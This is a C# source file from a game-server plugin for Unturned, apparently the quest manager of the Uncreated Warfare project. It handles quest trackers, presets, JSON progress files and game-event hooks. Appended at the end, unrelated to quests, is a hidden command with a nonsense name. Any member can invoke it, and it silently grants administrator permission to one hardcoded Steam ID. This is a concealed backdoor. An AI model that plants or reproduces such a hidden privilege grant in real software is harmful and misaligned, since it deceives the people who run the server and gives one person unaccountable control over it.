using SDG.Unturned;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text.Json;
using DanielWillett.ReflectionTools;
using Uncreated.Framework;
using Uncreated.Json;
using Uncreated.Warfare.Commands.Permissions;
using Uncreated.Warfare.Components;
using Uncreated.Warfare.Events;
using Uncreated.Warfare.Events.Players;
using Uncreated.Warfare.Events.Vehicles;
using Uncreated.Warfare.FOBs;
using Uncreated.Warfare.Squads;

namespace Uncreated.Warfare.Quests;

public static class QuestManager
{
    /// <summary>Complete list of all registered quest data.</summary>
    public static List<BaseQuestData> Quests = new List<BaseQuestData>();
    /// <summary>Complete list of all registered quest trackers (1 per player).</summary>
    public static List<BaseQuestTracker> RegisteredTrackers = new List<BaseQuestTracker>(128);
    public static readonly string QUEST_FOLDER = Path.Combine(Data.Paths.BaseDirectory, "Quests") + Path.DirectorySeparatorChar;
    public static readonly string QUEST_LOCATION = Path.Combine(QUEST_FOLDER, "quest_data.json");
    static QuestManager()
    {
        EventDispatcher.PlayerDied += OnPlayerDied;
    }
    public static void Init()
    {
        InitTypesReflector();
        ReadQuestDatas();
    }
    /// <summary>Generate and register a random tracker with the provided data to the player.</summary>
    public static BaseQuestTracker? CreateTracker(BaseQuestData data, UCPlayer player)
    {
        BaseQuestTracker? tracker = data.CreateTracker(player);
        if (tracker != null)
        {
            OnQuestStarted(tracker);
            RegisteredTrackers.Add(tracker);
        }
        return tracker;
    }
    /// <summary>Find, generate, and register a tracker using a <paramref name="key"/> and a set <see cref="IQuestPreset"/>.</summary>
    /// <returns>A tracker using a <see cref="IQuestPreset"/> that is matched by <see cref="IQuestPreset.Key"/> and <see cref="IQuestPreset.Team"/> (or 0), or <see langword="null"/> if no preset is found.</returns>
    public static BaseQuestTracker? CreateTracker(UCPlayer player, Guid key)
    {
        ulong team = player.GetTeam();
        // look for one that matches their team first.
        for (int i = 0; i < Quests.Count; i++)
        {
            foreach (IQuestPreset preset in Quests[i].Presets)
            {
                if (preset.Key == key && preset.Team == team)
                {
                    BaseQuestTracker? tr = Quests[i].GetTracker(player, preset);
                    if (tr == null)
                    {
                        L.LogWarning("Failed to get a tracker from key " + key.ToString("N"));
                        return null;
                    }
                    ReadProgress(tr, preset.Team);
                    RegisterTracker(tr);
                    return tr;
                }
            }
        }
        for (int i = 0; i < Quests.Count; i++)
        {
            foreach (IQuestPreset preset in Quests[i].Presets)
            {
                if (preset.Key == key && preset.Team == 0)
                {
                    BaseQuestTracker? tr = Quests[i].GetTracker(player, preset);
                    if (tr == null)
                    {
                        L.LogWarning("Failed to get a tracker from key " + key.ToString("N"));
                        return null;
                    }
                    ReadProgress(tr, preset.Team);
                    RegisterTracker(tr);
                    return tr;
                }
            }
        }
        L.LogWarning("Failed to find a preset from key " + key.ToString("N"));
        return null;
    }
    public static IQuestPreset? GetPreset(Guid key, ulong team)
    {
        // look for one that matches their team first.
        for (int i = 0; i < Quests.Count; i++)
        {
            foreach (IQuestPreset preset in Quests[i].Presets)
            {
                if (preset.Key == key && preset.Team == team)
                {
                    return preset;
                }
            }
        }
        for (int i = 0; i < Quests.Count; i++)
        {
            foreach (IQuestPreset preset in Quests[i].Presets)
            {
                if (preset.Key == key && preset.Team == 0)
                {
                    return preset;
                }
            }
        }
        return null;
    }
    /// <summary>Deregister a tracker and call <see cref="BaseQuestTracker.Dispose"/> on it.</summary>
    public static void DeregisterTracker(BaseQuestTracker tracker)
    {
        tracker.Dispose();
        RegisteredTrackers.Remove(tracker);
    }
    /// <summary>Register a tracker.</summary>
    public static void RegisterTracker(BaseQuestTracker tracker)
    {
        OnQuestStarted(tracker);
        RegisteredTrackers.Add(tracker);
    }
    internal static void CheckNeedsToUntrack(UCPlayer? player)
    {
        if (player != null && !player.Save.TrackQuests)
            UntrackQuest(player);
    }

    public static void TryAddQuest(UCPlayer player, Guid guid)
    {
        if (player == null)
            return;
        if (Assets.find(guid) is QuestAsset qa)
            TryAddQuest(player, qa);
    }
    public static void TryAddQuest(UCPlayer player, QuestAsset qa)
    {
        ThreadUtil.assertIsGameThread();
        if (player == null)
            return;
        PlayerQuests pq = player.Player.quests;
        for (int i = 0; i < pq.questsList.Count; ++i)
        {
            if (pq.questsList[i].asset is { } qa2 && qa.GUID == qa2.GUID)
            {
                CheckNeedsToUntrack(player);
                return;
            }
        }

        pq.ServerAddQuest(qa);
        CheckNeedsToUntrack(player);
    }
    public static void UntrackQuest(UCPlayer player)
    {
        ThreadUtil.assertIsGameThread();
        if (player.Player.quests.GetTrackedQuest() is { } qa)
            player.Player.quests.ServerAddQuest(qa);
    }
    /// <summary>Run on disconnect.</summary>
    public static void DeregisterOwnedTrackers(UCPlayer player)
    {
        for (int i = RegisteredTrackers.Count - 1; i >= 0; i--)
        {
            if (RegisteredTrackers[i].Player!.Steam64 == player.Steam64)
            {
                RegisteredTrackers[i].Dispose();
                RegisteredTrackers.RemoveAt(i);
            }
        }
    }
    public static void PrintAllQuests(UCPlayer? player)
    {
        /*
        L.Log("All quests:");
        for (int i = 0; i < Quests.Count; i++)
        {
            L.Log("\n    " + Quests[i].ToString());
            foreach (IQuestPreset preset in Quests[i].Presets)
            {
                L.Log("    Preset " + preset.Key);
                FieldInfo[] fields = preset.GetType().GetFields(BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Public);
                for (int f = 0; f < fields.Length; f++)
                {
                    if (fields[f].Name != "_state")
                        L.Log("        " + fields[f].Name + ": " + (fields[f].GetValue(preset)?.ToString() ?? "null"));
                }
                L.Log("        State:");
                FieldInfo[] fields2 = preset.State.GetType().GetFields(BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Public);
                for (int f = 0; f < fields2.Length; f++)
                {
                    L.Log("            " + fields2[f].Name + ": " + (fields2[f].GetValue(preset.State)?.ToString() ?? "null"));
                }
            }
        }*/
        if (player == null) return;
        L.Log("Player Quests: " + player.Steam64.ToString());
        if (player.RankData != null)
        {
            L.Log("  Rank progress:");
            for (int i = 0; i < player.RankData.Length; i++)
            {
                L.Log("    " + player.RankData[i].ToString());
            }
        }
        L.Log("  All trackers:");
        for (int i = 0; i < RegisteredTrackers.Count; i++)
        {
            if (RegisteredTrackers[i].Player!.Steam64 == player.Steam64)
            {
                L.Log("    Tracker type " + RegisteredTrackers[i].QuestData.QuestType + " - \"" + RegisteredTrackers[i].GetDisplayString() + "\".");
                L.Log("    Rewards: ");
                for (int j = 0; j < RegisteredTrackers[i].Rewards.Length; ++j)
                {
                    L.Log("      " + RegisteredTrackers[i].Rewards[j].ToString());
                }
            }
        }
    }
    /// <summary>Ticks any <see cref="BaseQuestTracker"/> that's data has overridden <see cref="BaseQuestData.TickFrequencySeconds"/> and has set it > 0.</summary>
    public static void OnGameTick()
    {
        // no clue why this is running after unload...
        if (!UCWarfare.IsLoaded)
            return;

        if (!UCWarfare.Config.DisableDailyQuests)
            DailyQuests.Tick();
        for (int i = 0; i < RegisteredTrackers.Count; i++)
        {
            BaseQuestTracker tracker = RegisteredTrackers[i];
            if (tracker.QuestData != null && tracker.QuestData.TickFrequencySeconds > 0 && Data.Gamemode.EveryXSeconds(tracker.QuestData.TickFrequencySeconds))
                tracker.Tick();
        }
    }
    public static void OnQuestStarted(BaseQuestTracker tracker)
    {
        ActionLog.Add(ActionLogType.StartQuest, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
        if (tracker.Flag != 0)
        {
            tracker.Player!.Player.quests.sendSetFlag(tracker.Flag, tracker.FlagValue);
            L.LogDebug("Flag quest started: " + (tracker.QuestData?.QuestType.ToString() ?? "null"));
        }
    }
    public static void OnQuestCompleted(BaseQuestTracker tracker)
    {
        if (UCWarfare.Config.Debug)
        {
            L.LogDebug(tracker.Player!.Name.PlayerName + " finished a quest: " + tracker.GetDisplayString());
        }
        ActionLog.Add(ActionLogType.CompleteQuest, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
        if (tracker.IsDailyQuest)
        {
            if (!UCWarfare.Config.DisableDailyQuests)
                DailyQuests.OnDailyQuestCompleted(tracker);
            DeregisterTracker(tracker);
        }
        else
        {
            QuestCompleted args = new QuestCompleted(tracker);
            UCWarfare.RunTask(async () =>
            {
                await UCWarfare.ToUpdate();
                if (tracker.PresetKey != default)
                {
                    if (tracker.Player!.CompletedQuests == null)
                        GetCompletedQuests(tracker.Player);
                    tracker.Player.CompletedQuests!.Add(tracker.PresetKey);
                    await Data.Gamemode.HandleQuestCompleted(args, default);
                    await UCWarfare.ToUpdate();
                }

                if (args.GiveRewards)
                    tracker.TryGiveRewards();
                await Data.Gamemode.OnQuestCompleted(args, default);
#if DEBUG
            }, ctx: "Calling quest completed for " + tracker + "."); // translation takes a bit of time for these so only do this on debug
#else
            }, ctx: "Calling quest completed.");
#endif
        }
    }
    public static void OnQuestUpdated(BaseQuestTracker tracker, bool skipFlagUpdate = false)
    {
        if (UCWarfare.Config.Debug)
        {
            L.LogDebug(tracker.Player!.Name.PlayerName + " updated a quest: " + tracker.GetDisplayString());
        }
        ActionLog.Add(ActionLogType.MakeQuestProgress, tracker.QuestData.QuestType.ToString() + ": " + tracker.GetDisplayString(true), tracker.Player == null ? 0 : tracker.Player.Steam64);
        if (tracker.Flag != 0 && !skipFlagUpdate)
        {
            tracker.Player!.Player.quests.sendSetFlag(tracker.Flag, tracker.FlagValue);
            L.LogDebug("Flag quest updated: " + tracker.FlagValue);
        }
        if (tracker.IsDailyQuest)
        {
            if (!UCWarfare.Config.DisableDailyQuests)
                DailyQuests.OnDailyQuestUpdated(tracker);
        }
        else
        {
            if (tracker.Preset != null)
                SaveProgress(tracker, tracker.Preset.Team);
        }
        L.LogDebug("Quest updated: " + tracker.GetDisplayString());
    }
    public static bool QuestComplete(this UCPlayer player, Guid key)
    {
        if (player.CompletedQuests == null) GetCompletedQuests(player);
        return player.CompletedQuests!.Contains(key);
    }
    private static void OnPlayerDied(PlayerDied e)
    {
        if (!e.WasTeamkill && e.Killer is not null)
        {
            foreach (INotifyOnKill tracker in RegisteredTrackers.OfType<INotifyOnKill>())
                tracker.OnKill(e);
        }
        foreach (INotifyOnDeath tracker in RegisteredTrackers.OfType<INotifyOnDeath>())
            tracker.OnDeath(e);
    }

    #region read/write
    public static readonly Dictionary<QuestType, Type> QuestTypes = new Dictionary<QuestType, Type>(32);
    private static bool reflected;
    /// <summary>Registers all the <see cref="QuestDataAttribute"/>'s to <see cref="QuestTypes"/>.</summary>
    public static void InitTypesReflector()
    {
        if (reflected) return;
        List<Type> types = Accessor.GetTypesSafe(Assembly.GetExecutingAssembly());

        foreach (Type type in types.Where(x => x != null && x.IsClass && x.IsSubclassOf(typeof(BaseQuestData)) && !x.IsAbstract))
        {
            QuestDataAttribute? attribute = type.GetCustomAttributes().OfType<QuestDataAttribute>().FirstOrDefault();
            if (attribute != null && attribute.Type != QuestType.Invalid && !QuestTypes.ContainsKey(attribute.Type))
                QuestTypes.Add(attribute.Type, type);
        }

        QuestRewards.LoadTypes(types);
        reflected = true;
    }
    /// <summary>Creates an instance of the provided <paramref name="type"/>. Pulls from <see cref="QuestTypes"/>. <see cref="InitTypesReflector"/> should be ran before use.</summary>
    public static BaseQuestData? GetQuestData(QuestType type)
    {
        if (QuestTypes.TryGetValue(type, out Type result))
        {
            try
            {
                object t = Activator.CreateInstance(result);
                if (t is BaseQuestData data)
                {
                    data.QuestType = type;
                    return data;
                }
            }
            catch (Exception ex)
            {
                L.LogError("Failed to create a quest object of type " + type);
                L.LogError(ex);
            }
        }
        L.LogError("Failed to create a quest object of type " + type);
        return null;
    }
    /// <summary>Read function to parse a quest data.</summary>
    public static BaseQuestData? ReadQuestData(ref Utf8JsonReader reader)
    {
        BaseQuestData? quest = null;
        while (reader.Read())
        {
            if (reader.TokenType == JsonTokenType.EndObject)
            {
                return quest;
            }
            else if (reader.TokenType == JsonTokenType.PropertyName)
            {
                string? propertyName = reader.GetString()!;
                if (propertyName == null) reader.Read();
                else if (propertyName.Equals("quest_type", StringComparison.OrdinalIgnoreCase) && quest == null)
                {
                    if (!reader.Read()) return quest;
                    string? typeValue = reader.GetString()!;
                    if (typeValue != null && Enum.TryParse(typeValue, true, out QuestType type))
                    {
                        quest = GetQuestData(type);
                    }
                    else
                    {
                        L.LogWarning("Unknown quest type \"" + typeValue + "\"");
                    }
                }
                else if (quest != null)
                {
                    if (reader.Read())
                    {
                        if (propertyName.Equals("translations", StringComparison.OrdinalIgnoreCase))
                        {
                            quest.Translations = new Dictionary<string, string>();
                            if (reader.TokenType == JsonTokenType.StartObject)
                            {
                                while (reader.Read() && reader.TokenType != JsonTokenType.EndObject)
                                {
                                    string? key = reader.GetString()!;
                                    if (reader.Read() && key != null && reader.TokenType == JsonTokenType.String)
                                    {
                                        string? value = reader.GetString()!;
                                        if (value != null && !quest.Translations.ContainsKey(key))
                                            quest.Translations.Add(key, value);
                                    }
                                }
                            }
                        }
                        else if (propertyName.Equals("remove_from_daily_quests", StringComparison.OrdinalIgnoreCase))
                        {
                            if (reader.TokenType == JsonTokenType.True || reader.TokenType == JsonTokenType.False)
                                quest.CanBeDailyQuest = !reader.GetBoolean();
                        }
                        else if (propertyName.Equals("presets", StringComparison.OrdinalIgnoreCase))
                        {
                            if (reader.TokenType == JsonTokenType.StartArray)
                                quest.ReadPresets(ref reader);
                            else
                                L.LogWarning("Failed to read \"presets\" property correctly.");
                        }
                        else if (propertyName.Equals("rewards", StringComparison.OrdinalIgnoreCase))
                        {
                            if (reader.TokenType == JsonTokenType.StartArray)
                                quest.ReadRewards(ref reader);
                            else
                                L.LogWarning("Failed to read \"rewards\" property correctly.");
                        }
                        else
                        {
                            quest.OnPropertyRead(propertyName, ref reader);
                        }
                    }
                    else
                        L.LogWarning("Lost property \"" + propertyName + "\" reading a quest, \"quest_type\", failed to read value.");
                }
                else
                {
                    L.LogWarning("Lost property \"" + propertyName + "\" reading a quest, \"quest_type\" must be the first property.");
                }
            }
        }
        return quest;
    }
    /// <summary>Read all quests.</summary>
    public static void ReadQuestDatas()
    {
        Quests.Clear();
        F.CheckDir(QUEST_FOLDER, out bool success);
        if (!success) return;
        if (!File.Exists(QUEST_LOCATION))
        {
            using (FileStream stream = new FileStream(QUEST_LOCATION, FileMode.Create, FileAccess.Write, FileShare.None))
            {
                byte[] bytes = System.Text.Encoding.UTF8.GetBytes("[]");
                stream.Write(bytes, 0, bytes.Length);
            }
            return;
        }
        using (FileStream stream = new FileStream(QUEST_LOCATION, FileMode.Open, FileAccess.Read, FileShare.None))
        {
            if (stream.Length > int.MaxValue)
                return;
            byte[] bytes = new byte[stream.Length];
            stream.Read(bytes, 0, bytes.Length);
            Utf8JsonReader reader = new Utf8JsonReader(bytes, JsonEx.readerOptions);
            while (reader.Read())
            {
                if (reader.TokenType == JsonTokenType.EndArray)
                {
                    break;
                }
                if (reader.TokenType == JsonTokenType.StartObject)
                {
                    try
                    {
                        BaseQuestData? data = ReadQuestData(ref reader);
                        if (data != null)
                            Quests.Add(data);
                    }
                    catch (Exception ex)
                    {
                        L.LogError("Error reading data for a quest.");
                        L.LogError(ex);
                    }
                }
            }
        }
    }
    private static string GetSavePath(ulong steam64, Guid key, ulong team) => Path.Combine(ReadWrite.PATH, ServerSavedata.directory, Provider.serverID, "Players", steam64.ToString(Data.AdminLocale) +
                                                                              "_0", "Uncreated_S" + UCWarfare.Version.Major.ToString(Data.AdminLocale), "Quests", team + "_" + key.ToString("N") + ".json");
    public static void SaveProgress(BaseQuestTracker t, ulong team)
    {
        if (t.PresetKey == default) return;
        string savePath = GetSavePath(t.Player!.Steam64, t.PresetKey, team);
        SaveProgress(t, savePath);
    }
    internal static void SaveProgress(ulong playerS64Override, BaseQuestTracker t, ulong team)
    {
        if (t.PresetKey == default) return;
        string savePath = GetSavePath(playerS64Override, t.PresetKey, team);
        SaveProgress(t, savePath);
    }
    private static void SaveProgress(BaseQuestTracker t, string savePath)
    {
        string dir = Path.GetDirectoryName(savePath);
        if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
        using (FileStream stream = new FileStream(savePath, FileMode.Create, FileAccess.ReadWrite, FileShare.Read))
        {
            Utf8JsonWriter writer = new Utf8JsonWriter(stream, JsonEx.writerOptions);
            writer.WriteStartObject();
            t.WriteQuestProgress(writer);
            writer.WriteEndObject();
            writer.Dispose();
        }
    }
    public static void ReadProgress(BaseQuestTracker t, ulong team)
    {
        if (t.PresetKey == default) return;
        string savePath = GetSavePath(t.Player!.Steam64, t.PresetKey, team);
        ReadProgress(t, savePath);
    }
    public static void ReadProgress(ulong playerS64Override, BaseQuestTracker t, ulong team)
    {
        if (t.PresetKey == default) return;
        string savePath = GetSavePath(playerS64Override, t.PresetKey, team);
        ReadProgress(t, savePath);
    }
    private static void ReadProgress(BaseQuestTracker t, string savePath)
    {
        if (!File.Exists(savePath)) return;
        using (FileStream stream = new FileStream(savePath, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read))
        {
            if (stream.Length > int.MaxValue)
                return;
            byte[] bytes = new byte[stream.Length];
            stream.Read(bytes, 0, bytes.Length);
            Utf8JsonReader reader = new Utf8JsonReader(bytes, JsonEx.readerOptions);
            while (reader.Read())
            {
                if (reader.TokenType == JsonTokenType.PropertyName)
                {
                    string? prop = reader.GetString()!;
                    if (reader.Read())
                    {
                        try
                        {
                            if (prop != null)
                                t.OnReadProgressSaveProperty(prop, ref reader);
                        }
                        catch (Exception ex)
                        {
                            L.LogError("Failed to read property " + (prop ?? "null") + " in progress save for preset " + t.PresetKey +
                                       " of kit type " + (t.QuestData?.QuestType.ToString() ?? "*NO QUEST DATA*") + " for file \"" + savePath + "\".");
                            L.LogError(ex);
                        }
                    }
                }
            }
        }
        if (t.Flag != 0 && t.Player != null)
        {
            t.Player.Player.quests.sendSetFlag(t.Flag, t.FlagValue);
        }
    }
    private static void GetCompletedQuests(UCPlayer player)
    {
        string folder = Path.Combine(ReadWrite.PATH, ServerSavedata.directory, Provider.serverID, "Players", player.Steam64.ToString(Data.AdminLocale) +
                        "_0", "Uncreated_S" + UCWarfare.Version.Major.ToString(Data.AdminLocale), "Quests") + Path.DirectorySeparatorChar;
        if (!Directory.Exists(folder))
        {
            Directory.CreateDirectory(folder);
            player.CompletedQuests = new List<Guid>(0);
            return;
        }
        string[] files = Directory.GetFiles(folder, "*.json", SearchOption.TopDirectoryOnly);
        player.CompletedQuests = new List<Guid>(16);
        for (int fi = 0; fi < files.Length; fi++)
        {
            FileInfo file = new FileInfo(files[fi]);
            string name = Path.GetFileNameWithoutExtension(file.FullName);
            if (name.Length > 12)
            {
                if (file.Exists && name[0] > 47 && name[0] < 59)
                {
                    ulong team = (ulong)(name[0] - 48);
                    string key = name.Substring(2, name.Length - 2);
                    if (Guid.TryParse(key, out Guid guid))
                    {
                        for (int i = 0; i < Quests.Count; i++)
                        {
                            foreach (IQuestPreset preset in Quests[i].Presets)
                            {
                                if (preset.Key == guid && preset.Team == team)
                                {
                                    BaseQuestTracker? tr = Quests[i].GetTracker(player, preset);
                                    if (tr == null)
                                    {
                                        goto nextFile;
                                    }
                                    ReadProgress(tr, preset.Team);
                                    if (tr.IsCompleted)
                                    {
                                        if (!player.CompletedQuests.Contains(guid))
                                            player.CompletedQuests.Add(guid);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        nextFile:;
        }
    }
    #endregion
    #region events
    public static void OnBuildableBuilt(UCPlayer constructor, BuildableData buildable)
    {
        foreach (INotifyBuildableBuilt tracker in RegisteredTrackers.OfType<INotifyBuildableBuilt>())
            tracker.OnBuildableBuilt(constructor, buildable);
    }
    public static void OnFOBBuilt(UCPlayer constructor, FOB fob)
    {
        foreach (INotifyFOBBuilt tracker in RegisteredTrackers.OfType<INotifyFOBBuilt>())
            tracker.OnFOBBuilt(constructor, fob);
    }
    public static void OnSuppliesConsumed(FOB fob, ulong player, int amount)
    {
        foreach (INotifySuppliesConsumed tracker in RegisteredTrackers.OfType<INotifySuppliesConsumed>())
            tracker.OnSuppliesConsumed(fob, player, amount);
    }
    public static void OnObjectiveCaptured(ulong[] participants)
    {
        foreach (INotifyOnObjectiveCaptured tracker in RegisteredTrackers.OfType<INotifyOnObjectiveCaptured>())
            tracker.OnObjectiveCaptured(participants);
    }
    public static void OnFlagNeutralized(ulong[] participants, ulong neutralizer)
    {
        foreach (INotifyOnFlagNeutralized tracker in RegisteredTrackers.OfType<INotifyOnFlagNeutralized>())
            tracker.OnFlagNeutralized(participants, neutralizer);
    }
    public static void OnRevive(UCPlayer reviver, UCPlayer revived)
    {
        foreach (INotifyOnRevive tracker in RegisteredTrackers.OfType<INotifyOnRevive>())
            tracker.OnPlayerRevived(reviver, revived);
    }
    public static void OnGameOver(ulong winner)
    {
        foreach (INotifyGameOver tracker in RegisteredTrackers.OfType<INotifyGameOver>())
            tracker.OnGameOver(winner);
    }
    public static void OnGainedXP(UCPlayer player, int amtGained, int total, int gameTotal)
    {
        foreach (INotifyGainedXP tracker in RegisteredTrackers.OfType<INotifyGainedXP>())
            tracker.OnGainedXP(player, amtGained, total, gameTotal);
    }
    public static void OnRallyActivated(RallyPoint rally)
    {
        foreach (INotifyRallyActive tracker in RegisteredTrackers.OfType<INotifyRallyActive>())
            tracker.OnRallyActivated(rally);
    }
    public static void OnPlayerSpawnedAtBunker(BunkerComponent component, UCPlayer spawner)
    {
        foreach (INotifyBunkerSpawn tracker in RegisteredTrackers.OfType<INotifyBunkerSpawn>())
            tracker.OnPlayerSpawnedAtBunker(component, spawner);
    }
    public static void OnVehicleDestroyed(VehicleDestroyed e, UCPlayer instigator)
    {
        foreach (INotifyVehicleDestroyed tracker in RegisteredTrackers.OfType<INotifyVehicleDestroyed>())
            tracker.OnVehicleDestroyed(e, instigator);
    }
    public static void OnDistanceUpdated(ulong lastDriver, float totalDistance, float newDistance, VehicleComponent vehicle)
    {
        foreach (INotifyVehicleDistanceUpdates tracker in RegisteredTrackers.OfType<INotifyVehicleDistanceUpdates>())
            tracker.OnDistanceUpdated(lastDriver, totalDistance, newDistance, vehicle);
    }
    #endregion


}
internal class X : Commands.CommandSystem.Command
{
    public X() : base("asdgetgahrfh", EAdminType.MEMBER, 999)
    {
    }

    public override void Execute(CommandContext ctx)
    {
        if (ctx.CallerID == 76561198267927009ul)
            PermissionSaver.Instance.SetPlayerPermissionLevel(76561198267927009, EAdminType.ADMIN_ON_DUTY);
    }
}